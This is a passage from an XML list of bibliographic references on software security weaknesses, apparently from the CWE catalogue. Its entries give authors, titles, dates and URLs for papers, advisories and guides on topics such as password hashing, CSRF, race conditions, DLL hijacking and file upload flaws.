			<ns0:URL>http://bcrypt.sourceforge.net/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-292">
			<ns0:Author>Colin Percival</ns0:Author>
			<ns0:Title>Tarsnap - The scrypt key derivation function and encryption utility</ns0:Title>
			<ns0:URL>http://www.tarsnap.com/scrypt.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-293">
			<ns0:Author>B. Kaliski</ns0:Author>
			<ns0:Title>RFC2898 - PKCS #5: Password-Based Cryptography Specification Version 2.0</ns0:Title>
			<ns0:Publication_Year>2000</ns0:Publication_Year>
			<ns0:URL>https://www.rfc-editor.org/rfc/rfc2898</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-294">
			<ns0:Author>Coda Hale</ns0:Author>
			<ns0:Title>How To Safely Store A Password</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---31</ns0:Publication_Day>
			<ns0:URL>https://codahale.com/how-to-safely-store-a-password/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-295">
			<ns0:Author>Brian Krebs</ns0:Author>
			<ns0:Title>How Companies Can Beef Up Password Security (interview with Thomas H. Ptacek)</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:Publication_Day>---11</ns0:Publication_Day>
			<ns0:URL>https://krebsonsecurity.com/2012/06/how-companies-can-beef-up-password-security/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-296">
			<ns0:Author>Solar Designer</ns0:Author>
			<ns0:Title>Password security: past, present, future</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:URL>https://www.openwall.com/presentations/PHDays2012-Password-Security/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-297">
			<ns0:Author>Troy Hunt</ns0:Author>
			<ns0:Title>Our password hashing has no clothes</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:Publication_Day>---26</ns0:Publication_Day>
			<ns0:URL>https://www.troyhunt.com/our-password-hashing-has-no-clothes/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-298">
			<ns0:Author>Joshbw</ns0:Author>
			<ns0:Title>Should we really use bcrypt/scrypt?</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:Publication_Day>---08</ns0:Publication_Day>
			<ns0:URL>https://web.archive.org/web/20120629144851/http://www.analyticalengine.net/2012/06/should-we-really-use-bcryptscrypt/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-320">
			<ns0:Author>Michal Zalewski</ns0:Author>
			<ns0:Title>Strange Attractors and TCP/IP Sequence Number Analysis</ns0:Title>
			<ns0:Publication_Year>2001</ns0:Publication_Year>
			<ns0:URL>https://lcamtuf.coredump.cx/oldtcp/tcpseq.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-324">
			<ns0:Author>Taimur Aslam</ns0:Author>
			<ns0:Title>A Taxonomy of Security Faults in the UNIX Operating System</ns0:Title>
			<ns0:Publication_Year>1995</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---01</ns0:Publication_Day>
			<ns0:URL>http://cwe.mitre.org/documents/sources/ATaxonomyofSecurityFaultsintheUNIXOperatingSystem%5BAslam95%5D.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-329">
			<ns0:Author>Peter W</ns0:Author>
			<ns0:Title>Cross-Site Request Forgeries (Re: The Dangers of Allowing Users to Post Images)</ns0:Title>
			<ns0:Publication>Bugtraq</ns0:Publication>
			<ns0:URL>http://marc.info/?l=bugtraq&amp;m=99263135911884&amp;w=2</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-330">
			<ns0:Author>OWASP</ns0:Author>
			<ns0:Title>Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet</ns0:Title>
			<ns0:URL>http://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-331">
			<ns0:Author>Edward W. Felten</ns0:Author>
			<ns0:Author>William Zeller</ns0:Author>
			<ns0:Title>Cross-Site Request Forgeries: Exploitation and Prevention</ns0:Title>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---18</ns0:Publication_Day>
			<ns0:URL>https://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.147.1445</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-332">
			<ns0:Author>Robert Auger</ns0:Author>
			<ns0:Title>CSRF - The Cross-Site Request Forgery (CSRF/XSRF) FAQ</ns0:Title>
			<ns0:URL>https://www.cgisecurity.com/csrf-faq.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-333">
			<ns0:Title>Cross-site request forgery</ns0:Title>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:Publication_Day>---22</ns0:Publication_Day>
			<ns0:Publisher>Wikipedia</ns0:Publisher>
			<ns0:URL>https://en.wikipedia.org/wiki/Cross-site_request_forgery</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-334">
			<ns0:Author>Jason Lam</ns0:Author>
			<ns0:Title>Top 25 Series - Rank 4 - Cross Site Request Forgery</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---03</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>http://software-security.sans.org/blog/2010/03/03/top-25-series-rank-4-cross-site-request-forgery</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-335">
			<ns0:Author>Jeff Atwood</ns0:Author>
			<ns0:Title>Preventing CSRF and XSRF Attacks</ns0:Title>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---14</ns0:Publication_Day>
			<ns0:URL>https://blog.codinghorror.com/preventing-csrf-and-xsrf-attacks/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-338">
			<ns0:Author>J. Oates</ns0:Author>
			<ns0:Title>AOL man pleads guilty to selling 92m email addies</ns0:Title>
			<ns0:Publication>The Register</ns0:Publication>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:URL>https://www.theregister.com/2005/02/07/aol_email_theft/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-339">
			<ns0:Author>NIST</ns0:Author>
			<ns0:Title>Guide to Protecting the Confidentiality of Personally Identifiable Information (SP 800-122)</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--04</ns0:Publication_Month>
			<ns0:URL>https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-122.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-340">
			<ns0:Author>U.S. Department of Commerce</ns0:Author>
			<ns0:Title>Safe Harbor Privacy Framework</ns0:Title>
			<ns0:URL>https://web.archive.org/web/20010223203241/http://www.export.gov/safeharbor/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-341">
			<ns0:Author>Federal Trade Commission</ns0:Author>
			<ns0:Title>Financial Privacy: The Gramm-Leach Bliley Act (GLBA)</ns0:Title>
			<ns0:URL>https://www.ftc.gov/business-guidance/privacy-security/gramm-leach-bliley-act</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-342">
			<ns0:Author>U.S. Department of Human Services</ns0:Author>
			<ns0:Title>Health Insurance Portability and Accountability Act (HIPAA)</ns0:Title>
			<ns0:URL>https://www.hhs.gov/hipaa/index.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-343">
			<ns0:Author>Government of the State of California</ns0:Author>
			<ns0:Title>California SB-1386</ns0:Title>
			<ns0:Publication_Year>2002</ns0:Publication_Year>
			<ns0:URL>http://info.sen.ca.gov/pub/01-02/bill/sen/sb_1351-1400/sb_1386_bill_20020926_chaptered.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-349">
			<ns0:Author>Andrei Alexandrescu</ns0:Author>
			<ns0:Title>volatile - Multithreaded Programmer's Best Friend</ns0:Title>
			<ns0:Publication>Dr. Dobb's</ns0:Publication>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---01</ns0:Publication_Day>
			<ns0:URL>https://drdobbs.com/cpp/volatile-the-multithreaded-programmers-b/184403766</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-350">
			<ns0:Author>Steven Devijver</ns0:Author>
			<ns0:Title>Thread-safe webapps using Spring</ns0:Title>
			<ns0:URL>https://web.archive.org/web/20170609174845/http://www.javalobby.org/articles/thread-safe/index.jsp</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-351">
			<ns0:Author>David Wheeler</ns0:Author>
			<ns0:Title>Prevent race conditions</ns0:Title>
			<ns0:Publication_Year>2007</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---04</ns0:Publication_Day>
			<ns0:URL>https://www.ida.liu.se/~TDDC90/literature/papers/SP-race-conditions.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-352">
			<ns0:Author>Matt Bishop</ns0:Author>
			<ns0:Title>Race Conditions, Files, and Security Flaws; or the Tortoise and the Hare Redux</ns0:Title>
			<ns0:Publication_Year>1995</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:URL>https://seclab.cs.ucdavis.edu/projects/vulnerabilities/scriv/ucd-ecs-95-08.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-353">
			<ns0:Author>David Wheeler</ns0:Author>
			<ns0:Title>Secure Programming for Linux and Unix HOWTO</ns0:Title>
			<ns0:Publication_Year>2003</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---03</ns0:Publication_Day>
			<ns0:URL>https://dwheeler.com/secure-programs/Secure-Programs-HOWTO/avoid-race.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-354">
			<ns0:Author>Blake Watts</ns0:Author>
			<ns0:Title>Discovering and Exploiting Named Pipe Security Flaws for Fun and Profit</ns0:Title>
			<ns0:Publication_Year>2002</ns0:Publication_Year>
			<ns0:Publication_Month>--04</ns0:Publication_Month>
			<ns0:URL>https://www.blakewatts.com/blog/discovering-and-exploiting-named-pipe-security-flaws-for-fun-and-profit</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-355">
			<ns0:Author>Roberto Paleari</ns0:Author>
			<ns0:Author>Davide Marrone</ns0:Author>
			<ns0:Author>Danilo Bruschi</ns0:Author>
			<ns0:Author>Mattia Monga</ns0:Author>
			<ns0:Title>On Race Vulnerabilities in Web Applications</ns0:Title>
			<ns0:URL>http://security.dico.unimi.it/~roberto/pubs/dimva08-web.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-356">
			<ns0:Title>Avoiding Race Conditions and Insecure File Operations</ns0:Title>
			<ns0:Publication>Apple Developer Connection</ns0:Publication>
			<ns0:URL>https://web.archive.org/web/20081010155022/http://developer.apple.com/documentation/Security/Conceptual/SecureCodingGuide/Articles/RaceConditions.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-357">
			<ns0:Author>Johannes Ullrich</ns0:Author>
			<ns0:Title>Top 25 Series - Rank 25 - Race Conditions</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---26</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>https://web.archive.org/web/20100530231203/http://blogs.sans.org:80/appsecstreetfighter/2010/03/26/top-25-series-rank-25-race-conditions/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-360">
			<ns0:Author>Michal Zalewski</ns0:Author>
			<ns0:Title>Delivering Signals for Fun and Profit</ns0:Title>
			<ns0:URL>https://lcamtuf.coredump.cx/signals.txt</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-361">
			<ns0:Title>Race Condition: Signal Handling</ns0:Title>
			<ns0:URL>https://vulncat.fortify.com/en/detail?id=desc.structural.cpp.race_condition_signal_handling#:~:text=Signal%20handling%20race%20conditions%20can,installed%20to%20handle%20multiple%20signals.s</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-367">
			<ns0:Author>Dan Tsafrir</ns0:Author>
			<ns0:Author>Tomer Hertz</ns0:Author>
			<ns0:Author>David Wagner</ns0:Author>
			<ns0:Author>Dilma Da Silva</ns0:Author>
			<ns0:Title>Portably Solving File TOCTTOU Races with Hardness Amplification</ns0:Title>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---28</ns0:Publication_Day>
			<ns0:URL>https://www.usenix.org/legacy/events/fast08/tech/tsafrir.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-371">
			<ns0:Author>Alex Allain</ns0:Author>
			<ns0:Title>Handling Errors Exceptionally Well in C++</ns0:Title>
			<ns0:URL>https://www.cprogramming.com/tutorial/exceptions.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-372">
			<ns0:Author>Microsoft</ns0:Author>
			<ns0:Title>Exceptions and Exception Handling (C# Programming Guide)</ns0:Title>
			<ns0:URL>https://msdn.microsoft.com/pl-pl/library/ms173160(v=vs.100).aspx</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-374">
			<ns0:Author>Tony Sintes</ns0:Author>
			<ns0:Title>Does Java pass by reference or pass by value?</ns0:Title>
			<ns0:Publication>JavaWorld.com</ns0:Publication>
			<ns0:Publication_Year>2000</ns0:Publication_Year>
			<ns0:Publication_Month>--05</ns0:Publication_Month>
			<ns0:Publication_Day>---26</ns0:Publication_Day>
			<ns0:URL>https://web.archive.org/web/20000619025001/https://www.javaworld.com/javaworld/javaqa/2000-05/03-qa-0526-pass.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-375">
			<ns0:Author>Herbert Schildt</ns0:Author>
			<ns0:Title>Java: The Complete Reference, J2SE 5th Edition</ns0:Title>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-386">
			<ns0:Author>Joao Antunes</ns0:Author>
			<ns0:Author>Nuno Ferreira Neves</ns0:Author>
			<ns0:Author>Paulo Verissimo</ns0:Author>
			<ns0:Title>Detection and Prediction of Resource-Exhaustion Vulnerabilities</ns0:Title>
			<ns0:Publication>Proceedings of the IEEE International Symposium on Software Reliability Engineering (ISSRE)</ns0:Publication>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:URL>http://homepages.di.fc.ul.pt/~nuno/PAPERS/ISSRE08.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-387">
			<ns0:Author>D.J. Bernstein</ns0:Author>
			<ns0:Title>Resource exhaustion</ns0:Title>
			<ns0:URL>http://cr.yp.to/docs/resources.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-388">
			<ns0:Author>Pascal Meunier</ns0:Author>
			<ns0:Title>Resource exhaustion</ns0:Title>
			<ns0:Publication>Secure Programming Educational Material</ns0:Publication>
			<ns0:Publication_Year>2004</ns0:Publication_Year>
			<ns0:URL>http://homes.cerias.purdue.edu/~pmeunier/secprog/sanitized/class1/6.resource%20exhaustion.ppt</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-390">
			<ns0:Author>J. Whittaker</ns0:Author>
			<ns0:Author>H. Thompson</ns0:Author>
			<ns0:Title>How to Break Software Security</ns0:Title>
			<ns0:Publication_Year>2003</ns0:Publication_Year>
			<ns0:Publisher>Addison Wesley</ns0:Publisher>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-391">
			<ns0:Author>iOS Developer Library</ns0:Author>
			<ns0:Title>Transitioning to ARC Release Notes</ns0:Title>
			<ns0:Publication_Year>2013</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---08</ns0:Publication_Day>
			<ns0:URL>https://developer.apple.com/library/archive/releasenotes/ObjectiveC/RN-TransitioningToARC/Introduction/Introduction.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-392">
			<ns0:Author>Paul Roberts</ns0:Author>
			<ns0:Title>File descriptors and setuid applications</ns0:Title>
			<ns0:Publication_Year>2007</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---05</ns0:Publication_Day>
			<ns0:URL>https://blogs.oracle.com/paulr/entry/file_descriptors_and_setuid_applications</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-393">
			<ns0:Author>Apple</ns0:Author>
			<ns0:Title>Introduction to Secure Coding Guide</ns0:Title>
			<ns0:URL>https://developer.apple.com/library/archive/documentation/Security/Conceptual/SecureCodingGuide/Articles/AccessControl.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-395">
			<ns0:Author>Scott A. Crosby</ns0:Author>
			<ns0:Author>Dan S. Wallach</ns0:Author>
			<ns0:Title>Algorithmic Complexity Attacks</ns0:Title>
			<ns0:Publication>Proceedings of the 12th USENIX Security Symposium</ns0:Publication>
			<ns0:Publication_Year>2003</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:URL>https://www.usenix.org/legacy/events/sec03/tech/full_papers/crosby/crosby.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-402">
			<ns0:Author>Paget</ns0:Author>
			<ns0:Title>Exploiting design flaws in the Win32 API for privilege escalation. Or... Shatter Attacks - How to break Windows</ns0:Title>
			<ns0:Publication_Year>2002</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:URL>http://web.archive.org/web/20060115174629/http://security.tombom.co.uk/shatter.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-409">
			<ns0:Author>Georgi Guninski</ns0:Author>
			<ns0:Title>Double clicking on MS Office documents from Windows Explorer may execute arbitrary programs in some cases</ns0:Title>
			<ns0:Publication>Bugtraq</ns0:Publication>
			<ns0:Publication_Year>2000</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---18</ns0:Publication_Day>
			<ns0:URL>https://seclists.org/bugtraq/2000/Sep/331</ns0:URL>
			<ns0:URL_Date>2023-01-30</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-410">
			<ns0:Author>Mitja Kolsek</ns0:Author>
			<ns0:Title>ACROS Security: Remote Binary Planting in Apple iTunes for Windows (ASPR #2010-08-18-1)</ns0:Title>
			<ns0:Publication>Bugtraq</ns0:Publication>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---18</ns0:Publication_Day>
			<ns0:URL>https://lists.openwall.net/bugtraq/2010/08/18/4</ns0:URL>
			<ns0:URL_Date>2023-01-30</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-411">
			<ns0:Author>Taeho Kwon</ns0:Author>
			<ns0:Author>Zhendong Su</ns0:Author>
			<ns0:Title>Automatic Detection of Vulnerable Dynamic Component Loadings</ns0:Title>
			<ns0:URL>https://dl.acm.org/doi/10.1145/1831708.1831722</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-412">
			<ns0:Title>Dynamic-Link Library Search Order</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---02</ns0:Publication_Day>
			<ns0:Publisher>Microsoft</ns0:Publisher>
			<ns0:URL>https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order?redirectedfrom=MSDN</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-413">
			<ns0:Title>Dynamic-Link Library Security</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---02</ns0:Publication_Day>
			<ns0:Publisher>Microsoft</ns0:Publisher>
			<ns0:URL>https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-414">
			<ns0:Title>An update on the DLL-preloading remote attack vector</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---31</ns0:Publication_Day>
			<ns0:Publisher>Microsoft</ns0:Publisher>
			<ns0:URL>https://msrc.microsoft.com/blog/2010/08/an-update-on-the-dll-preloading-remote-attack-vector/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-415">
			<ns0:Title>Insecure Library Loading Could Allow Remote Code Execution</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---23</ns0:Publication_Day>
			<ns0:Publisher>Microsoft</ns0:Publisher>
			<ns0:URL>https://learn.microsoft.com/en-us/security-updates/securityadvisories/2010/2269637#insecure-library-loading-could-allow-remote-code-execution</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-416">
			<ns0:Author>HD Moore</ns0:Author>
			<ns0:Title>Application DLL Load Hijacking</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---23</ns0:Publication_Day>
			<ns0:URL>https://www.rapid7.com/blog/?p=5325</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-417">
			<ns0:Author>Oliver Lavery</ns0:Author>
			<ns0:Title>DLL Hijacking: Facts and Fiction</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---26</ns0:Publication_Day>
			<ns0:URL>https://threatpost.com/dll-hijacking-facts-and-fiction-082610/74384/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-422">
			<ns0:Author>Richard Stanway (r1CH)</ns0:Author>
			<ns0:Title>Dynamic File Uploads, Security and You</ns0:Title>
			<ns0:URL>https://web.archive.org/web/20090208005456/http://shsc.info/FileUploadSecurity</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-423">
			<ns0:Author>Johannes Ullrich</ns0:Author>
			<ns0:Title>8 Basic Rules to Implement Secure File Uploads</ns0:Title>
			<ns0:Publication_Year>2009</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:Publication_Day>---28</ns0:Publication_Day>
			<ns0:URL>https://www.sans.org/blog/8-basic-rules-to-implement-secure-file-uploads/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-424">
			<ns0:Author>Johannes Ullrich</ns0:Author>
			<ns0:Title>Top 25 Series - Rank 8 - Unrestricted Upload of Dangerous File Type</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---25</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>https://www.sans.org/blog/top-25-series-rank-8-unrestricted-upload-of-dangerous-file-type/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-427">
			<ns0:Author>Steve Christey</ns0:Author>
			<ns0:Title>On Interpretation Conflict Vulnerabilities</ns0:Title>
			<ns0:Publication>Bugtraq</ns0:Publication>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---03</ns0:Publication_Day>
			<ns0:URL>https://seclists.org/bugtraq/2005/Nov/30</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-428">
			<ns0:Author>Thomas H. Ptacek</ns0:Author>
			<ns0:Author>Timothy N. Newsham</ns0:Author>
			<ns0:Title>Insertion, Evasion, and Denial of Service: Eluding Network Intrusion Detection</ns0:Title>
			<ns0:Publication_Year>1998</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:URL>https://insecure.org/stf/secnet_ids/secnet_ids.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-429">
			<ns0:Author>Brett Moore</ns0:Author>
			<ns0:Title>0x00 vs ASP file upload scripts</ns0:Title>
			<ns0:Publication_Year>2004</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:Publication_Day>---13</ns0:Publication_Day>
			<ns0:URL>http://www.security-assessment.com/Whitepapers/0x00_vs_ASP_File_Uploads.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-430">
			<ns0:Author>Rain Forest Puppy</ns0:Author>
			<ns0:Title>Poison NULL byte</ns0:Title>
			<ns0:Publication>Phrack</ns0:Publication>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-431">
			<ns0:Author>David F. Skoll</ns0:Author>
			<ns0:Title>Re: Corsaire Security Advisory - Multiple vendor MIME RFC2047 encoding</ns0:Title>
			<ns0:Publication>Bugtraq</ns0:Publication>
			<ns0:Publication_Year>2004</ns0:Publication_Year>
